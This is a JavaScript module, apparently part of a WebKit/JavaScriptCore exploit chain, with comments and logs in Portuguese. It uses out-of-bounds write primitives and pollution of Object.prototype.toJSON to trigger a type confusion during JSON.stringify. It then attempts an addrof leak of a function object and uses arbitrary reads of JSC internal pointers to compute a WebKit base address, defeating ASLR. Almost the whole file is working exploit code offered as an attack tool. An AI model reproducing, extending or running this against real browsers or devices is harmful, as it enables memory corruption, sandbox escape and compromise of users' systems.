// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43k - Tentativa de Addrof na Sonda)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
    selfTestTypeConfusionAndMemoryControl,
    // attemptAddrofUsingCoreHeisenbug // Não vamos mais focar neste por enquanto
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256; // Pode precisar ser maior para acomodar o objeto função + dados
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xABABABAB]; // Reduzir para 1 valor para acelerar testes de addrof

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = Math.random(); // Aleatório para evitar otimizações
const PROBE_CALL_LIMIT_V82 = 10;

const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18); 
const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);   

// Criar uma nova instância da função alvo a cada execução do teste principal para tentar evitar problemas de otimização/cache
let targetFunctionForLeak; 

let leaked_target_function_addr = null; 

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) { 
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();

    if (high === 0 && low === 0) return false; // Nulo
    
    // Checagem mais estrita para NaN/Infinity baseado na representação de bits IEEE 754 double
    // Exponent all 1s (bits 52-62 set in high word, when looking at the 64-bit pattern)
    // 0x7FF00000 (high) and 0x0 (low) is Infinity.
    // 0x7FF00000 (high) and non-zero (low) is QNaN (e.g. first bit of mantissa set)
    // 0x7FF80000 (high) and 0x0 (low) é um QNaN comum que temos visto (0x7FF8000000000000)
    if (high === 0x7FF80000 && low === 0x0) { // NaN específico que estamos vendo
        logS3(`[isValidPointer${context}] Rejeitado: Padrão NaN específico ${ptr.toString(true)}`, 'debug');
        return false;
    }
    if ((high & 0x7FF00000) === 0x7FF00000) { // Exponent bits all 1s (covers all NaN/Infinity)
        logS3(`[isValidPointer${context}] Rejeitado: Provável NaN/Infinity (high: ${toHex(high)}) ${ptr.toString(true)}`, 'debug');
        return false; 
    }
    if (high === 0 && low < 0x10000) { // Endereços muito baixos
        logS3(`[isValidPointer${context}] Rejeitado: Endereço baixo ${ptr.toString(true)}`, 'debug');
        return false;
    }
    return true;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { 
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof + WebKit Base Leak (R43k) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R43k...`;

    // Criar nova instância da função alvo para esta execução
    targetFunctionForLeak = function someUniqueLeakFunctionR43k_Instance() { return `target_R43k_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');


    logS3(`--- Fase 0 (R43k): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    let coreTCAndMemControlOK = false;
    
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
        
        coreTCAndMemControlOK = await selfTestTypeConfusionAndMemoryControl(logS3);
        logS3(`Sanity Check (selfTestTypeConfusionAndMemoryControl): ${coreTCAndMemControlOK ? 'SUCESSO' : 'FALHA'}`, coreTCAndMemControlOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
        
        if (!coreOOBReadWriteOK || !coreTCAndMemControlOK) {
            logS3("AVISO CRÍTICO: Um ou mais Sanity Checks do Core Exploit falharam. A confiabilidade do teste principal está comprometida.", "critical", FNAME_CURRENT_TEST_BASE);
            // Poderia optar por abortar aqui se os sanity checks são mandatórios
        }
    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
         console.error("Erro em Sanity Checks:", e_sanity);
    }
    await PAUSE_S3(100);

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (R43k): Not run.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R43k): Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        leaked_target_function_addr = null; 
        const current_oob_hex_val = toHex(current_oob_value !== undefined && current_oob_value !== null ? current_oob_value : 0);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION R43k: OOB Write Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null;
        let iteration_tc_first_detection_done = false;
        let iter_addrof_result = { success: false, msg: "Addrof (R43k): Not run in this iter.", leaked_object_addr: null, leaked_object_addr_candidate_str: null };

        function toJSON_TA_Probe_Iter_Closure_R43k() {
            probe_call_count_iter++; const call_num = probe_call_count_iter; const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_Iter_R43k" }; // Objeto simples
                    marker_M1_ref_iter = { marker_id_v82: "M1_Iter_R43k", payload_M2: marker_M2_ref_iter };
                    return marker_M1_ref_iter;
                } else if (is_m2c) { 
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_R43k", this_type: "[object Object]",
                            this_is_M2: true, getter_fired: true, // Marcamos como se o getter tivesse disparado para o addrof
                            leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                        };
                        logS3(`[PROBE_R43k] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_v82}. Tentando Addrof...`, "vuln");
                    }

                    // Tentativa de Addrof (apenas na primeira vez que a TC é detectada nesta chamada)
                    if (iteration_final_tc_details_from_probe && 
                        iteration_final_tc_details_from_probe.call_number_tc_detected === call_num &&
                        !iter_addrof_result.success) { // Tenta addrof apenas uma vez por trigger de TC

                        if (!victim_typed_array_ref_iter?.buffer) {
                            iter_addrof_result.msg = "Addrof (R43k): victim_typed_array_ref_iter.buffer é nulo.";
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_victim_null";
                            return this; // Não pode prosseguir com addrof
                        }
                        
                        logS3(`[PROBE_R43k_ADDROF] Alvo para addrof: ${typeof targetFunctionForLeak}`, 'debug');
                        if (typeof targetFunctionForLeak !== 'function') {
                             iter_addrof_result.msg = "Addrof (R43k): targetFunctionForLeak não é uma função.";
                             return this;
                        }

                        let float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                        let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                        // Salva o conteúdo original dos primeiros 8 bytes do buffer da vítima
                        const original_low = uint32_view[0]; 
                        const original_high = uint32_view[1];
                        logS3(`[PROBE_R43k_ADDROF] Conteúdo original do buffer da vítima [0-7]: low=0x${original_low.toString(16)}, high=0x${original_high.toString(16)}`, 'debug');


                        try {
                            // Tenta escrever o objeto função no buffer. Esta é a operação crucial.
                            float_view[0] = targetFunctionForLeak; 
                            
                            const leaked_low = uint32_view[0];
                            const leaked_high = uint32_view[1];
                            logS3(`[PROBE_R43k_ADDROF_DEBUG] Raw após escrita: low=0x${leaked_low.toString(16)}, high=0x${leaked_high.toString(16)}`, "leak");
                            
                            const potential_addr = new AdvancedInt64(leaked_low, leaked_high); 
                            iter_addrof_result.leaked_object_addr_candidate_str = potential_addr.toString(true);
                            logS3(`[PROBE_R43k_ADDROF] Candidato Addr para targetFunctionForLeak: ${iter_addrof_result.leaked_object_addr_candidate_str}`, "leak");

                            if (isValidPointer(potential_addr, "_probeAddrof")) {
                                leaked_target_function_addr = potential_addr; 
                                iter_addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true);
                                iter_addrof_result.success = true;
                                iter_addrof_result.msg = "Addrof (R43k): Sucesso ao obter endereço candidato da função.";
                                if (iteration_final_tc_details_from_probe) {
                                    iteration_final_tc_details_from_probe.leak_val_getter_int64 = potential_addr.toString(true);
                                    iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                }
                                logS3(`[PROBE_R43k_ADDROF] SUCESSO! Endereço de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "vuln");
                            } else {
                                iter_addrof_result.msg = `Addrof (R43k): Endereço candidato (${iter_addrof_result.leaked_object_addr_candidate_str}) não parece ponteiro válido.`;
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = iter_addrof_result.leaked_object_addr_candidate_str + " (invalido)";
                                 // Se o valor lido for o mesmo que o original, a escrita do objeto não teve efeito visível nos bits.
                                if (leaked_low === original_low && leaked_high === original_high) {
                                    iter_addrof_result.msg += " Conteúdo do buffer não alterado pela escrita do objeto.";
                                    logS3(`[PROBE_R43k_ADDROF] Conteúdo do buffer não foi alterado pela atribuição de targetFunctionForLeak.`, "warn");
                                }
                            }
                        } catch (e_addrof) {
                            iter_addrof_result.msg = `Addrof (R43k) EXCEPTION: ${e_addrof.message}`;
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = `addrof_ex:${e_addrof.message}`;
                             console.error("[PROBE_R43k_ADDROF] Exceção durante addrof:", e_addrof);
                        } finally {
                            // Restaura o conteúdo original para minimizar corrupção
                            uint32_view[0] = original_low;
                            uint32_view[1] = original_high;
                            logS3(`[PROBE_R43k_ADDROF] Conteúdo do buffer da vítima [0-7] restaurado.`, 'debug');
                        }
                    }
                    return this; 
                }
            } catch (e_pm) {
                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `ProbeMainErr:${e_pm.message}`;
                return { err_pm: call_num, msg: e_pm.message };
            }
            return { gen_m: call_num, type: ctts };
        }

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null;
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R43k): Not run in this iter.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null };
        let heisenbugConfirmedThisIter = false;

        try {
            logS3(`  --- Fase 1 (R43k): Detecção de Type Confusion & Addrof ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150);
            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);

            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43k, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output }; }

                if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  TC Probe R43k: TC on M2 CONFIRMED. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'}`, iter_addrof_result.success ? "vuln" : "warn");
                } else {
                    logS3(`  TC Probe R43k: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");
                }
            } catch (e_str) {
                if (!iter_primary_error) iter_primary_error = e_str;
                logS3(`  TC/Addrof Probe R43k: JSON.stringify EXCEPTION: ${e_str.message}`, "error");
                 console.error("Erro no stringify R43k:", e_str);
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }
            logS3(`  --- Fase 1 (R43k) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, "subtest");
            await PAUSE_S3(100);

            logS3(`  --- Fase 2 (R43k): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter && iter_addrof_result.success && leaked_target_function_addr) {
                if (!coreOOBReadWriteOK) { 
                    iter_webkit_leak_result.msg = "WebKit Leak (R43k): Pulado. Core OOB R/W Sanity Check FALHOU. arb_read instável.";
                    logS3(iter_webkit_leak_result.msg, "critical");
                } else {
                     if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreArbReadCheck`)) {
                         await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-PreArbReadCheckReinit` });
                     }
                
                    if (!isOOBReady()) {
                        iter_webkit_leak_result.msg = "WebKit Leak (R43k): Falha ao preparar/re-preparar ambiente OOB para arb_read.";
                        logS3(iter_webkit_leak_result.msg, "error");
                    } else {
                        try {
                            logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info');

                            const ptr_to_executable_instance = await arb_read(leaked_target_function_addr.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            iter_webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_to_executable_instance) ? ptr_to_executable_instance.toString(true) : String(ptr_to_executable_instance);
                            if (!isValidPointer(ptr_to_executable_instance, "_execInst")) {
                                throw new Error(`Ponteiro para ExecutableInstance inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage1}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para ExecutableInstance lido de [func_addr + ${JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE.toString(true)}]: ${ptr_to_executable_instance.toString(true)}`, 'leak');
                            
                            const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance.add(JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                            iter_webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_to_jit_or_vm) ? ptr_to_jit_or_vm.toString(true) : String(ptr_to_jit_or_vm);
                            if (!isValidPointer(ptr_to_jit_or_vm, "_jitVm")) {
                                throw new Error(`Ponteiro para JIT/VM inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage2}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para JIT/VM lido de [exec_addr + ${JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM.toString(true)}]: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
                            
                            const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);   
                            const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb); 

                            iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                            iter_webkit_leak_result.success = true;
                            iter_webkit_leak_result.msg = `WebKitLeak (R43k): Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`;
                            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

                        } catch (e_webkit_leak) {
                            iter_webkit_leak_result.msg = `WebKitLeak (R43k) EXCEPTION: ${e_webkit_leak.message || String(e_webkit_leak)}`;
                            logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error");
                            if (!iter_primary_error) iter_primary_error = e_webkit_leak;
                             console.error("Erro no WebKitLeak R43k:", e_webkit_leak);
                        }
                    }
                }
            } else {
                 let skipMsg = "WebKitLeak (R43k): Pulado. ";
                 if (!heisenbugConfirmedThisIter) skipMsg += "TC Fase 1 falhou. ";
                 if (!iter_addrof_result.success) skipMsg += "Addrof falhou. ";
                 if (!leaked_target_function_addr) skipMsg += "Endereço da função alvo não obtido. ";
                 iter_webkit_leak_result.msg = skipMsg;
                 logS3(iter_webkit_leak_result.msg, "warn");
            }
            logS3(`  --- Fase 2 (R43k) Concluída. WebKitLeak Sucesso: ${iter_webkit_leak_result.success} ---`, "subtest");

        } catch (e_outer_iter) { 
            if (!iter_primary_error) iter_primary_error = e_outer_iter;
            logS3(`  CRITICAL ERROR ITERATION R43k: ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
             console.error("Outer error in iteration R43k:", e_outer_iter);
        } finally {
            await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR43k` });
        }

        final_probe_call_count_for_report = probe_call_count_iter;

        let current_iter_summary = {
            oob_value: current_oob_hex_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null,
            stringifyResult: iter_stringify_output_parsed,
            addrof_result_this_iter: iter_addrof_result,
            webkit_leak_result_this_iter: iter_webkit_leak_result,
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);
        
        if (current_iter_summary.error === null) {
            let current_is_better_than_best = false;
            if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_value_used === null ) {
                current_is_better_than_best = true;
            } else {
                const current_score = (current_iter_summary.webkit_leak_result_this_iter.success ? 4 : 0) +
                                      (current_iter_summary.addrof_result_this_iter.success ? 2 : 0) +
                                      (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                const best_score = (best_result_for_runner.webkit_leak_result.success ? 4 : 0) +
                                   (best_result_for_runner.addrof_result.success ? 2 : 0) +
                                   (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                if (current_score > best_score) {
                    current_is_better_than_best = true;
                }
            }

            if (current_is_better_than_best) {
                 best_result_for_runner = {
                    errorOccurred: null,
                    tc_probe_details: current_iter_summary.tc_probe_details,
                    stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter,
                    webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                    oob_value_used: current_iter_summary.oob_value,
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                };
            }
        } else if (best_result_for_runner.oob_value_used === null && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
            best_result_for_runner = { 
                errorOccurred: current_iter_summary.error,
                tc_probe_details: current_iter_summary.tc_probe_details,
                stringifyResult: current_iter_summary.stringifyResult,
                addrof_result: current_iter_summary.addrof_result_this_iter,
                webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                oob_value_used: current_iter_summary.oob_value,
                heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
            };
        }

        if (iter_webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43k: WebKitLeak OK!`;
        else if (iter_addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43k: Addrof OK`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_CURRENT_TEST_BASE}_R43k: TC OK`;
        else document.title = `${FNAME_CURRENT_TEST_BASE}_R43k: Iter Done (${current_oob_hex_val})`;
        await PAUSE_S3(250);
    }
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R43k): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
